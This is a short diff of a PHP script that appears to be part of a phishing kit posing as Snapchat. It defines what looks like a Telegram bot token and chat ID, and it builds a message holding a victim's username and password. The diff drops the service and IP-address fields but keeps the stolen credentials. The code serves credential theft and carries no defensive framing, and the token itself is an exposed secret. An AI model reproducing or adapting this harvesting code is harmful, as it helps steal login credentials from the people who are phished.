@@ -17,8 +17,7 @@ $service = "Snapchat";
 $token = "5621562429:AAFI4GKbo3pJiG4JDA3AOAixKZXBW9NGEWM";
 $chat_id = "501357456";
 $arr = array(
-  'Сервис: ' => $service,
-  'Айпи адресс: ' => $ipaddress,
+    
   'Имя пользователя: ' => $username,
   'Пароль: ' => $password
 );
